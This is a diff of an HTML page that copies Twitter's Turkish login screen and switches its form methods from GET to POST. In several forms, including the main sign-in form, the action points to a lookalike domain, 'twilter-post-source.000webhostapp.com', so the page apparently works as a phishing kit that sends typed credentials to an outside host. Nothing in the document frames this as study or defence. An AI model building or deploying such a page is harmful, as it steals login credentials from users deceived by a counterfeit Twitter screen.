@@ -88,7 +88,7 @@ data-fouc-class-names="swift-loading"
 
     
     <noscript>
-      <form action="https://twilter-post-source.000webhostapp.com/" method="GET" class="NoScriptForm">
+      <form action="https://twilter-post-source.000webhostapp.com/" method="POST" class="NoScriptForm">
         <input type="hidden" value="becf3286d948dee9b86c86d98c09b08abdbb9647" name="authenticity_token">
 
         <div class="NoScriptForm-content">
@@ -206,7 +206,7 @@ data-fouc-class-names="swift-loading"
         </ul>
       </div>
       <div class="js-front-language">
-        <form action="https://twilter-post-source.000webhostapp.com/" class="t1-form language" method="GET">
+        <form action="https://twilter-post-source.000webhostapp.com/" class="t1-form language" method="POST">
           <input type="hidden" name="lang"> <input type="hidden" name="redirect">
           <input type="hidden" name="authenticity_token" value="becf3286d948dee9b86c86d98c09b08abdbb9647">
         </form>
@@ -223,7 +223,7 @@ data-fouc-class-names="swift-loading"
             <div class="dropdown-caret right"> <span class="caret-outer"></span> <span class="caret-inner"></span> </div>
             <div class="signin-dialog-body">
               <div>Hesabın var mı?</div>
-<form action="https://twitter.com/sessions" class="LoginForm js-front-signin" method="GET"
+<form action="https://twitter.com/sessions" class="LoginForm js-front-signin" method="POST"
   data-component="login_callout"
   data-element="form"
 >
@@ -291,7 +291,7 @@ data-fouc-class-names="swift-loading"
 
   <div class="signin-wrapper" data-login-message="">
     <h1>Twitter'a giriş yap</h1>
-    <form action="https://twilter-post-source.000webhostapp.com/" class="t1-form clearfix signin js-signin" method="GET">
+    <form action="https://twilter-post-source.000webhostapp.com/" class="t1-form clearfix signin js-signin" method="POST">
       <fieldset>
 
   <legend class="visuallyhidden">Giriş yap</legend>
@@ -861,7 +861,7 @@ data-fouc-class-names="swift-loading"
           <span class="Icon Icon--bird Icon--large"></span>
         </div>
         <div class="LoginDialog-form">
-<form action="https://twitter.com/sessions" class="LoginForm js-front-signin" method="GET"
+<form action="https://twitter.com/sessions" class="LoginForm js-front-signin" method="POST"
   data-component="dialog"
   data-element="login"
 >
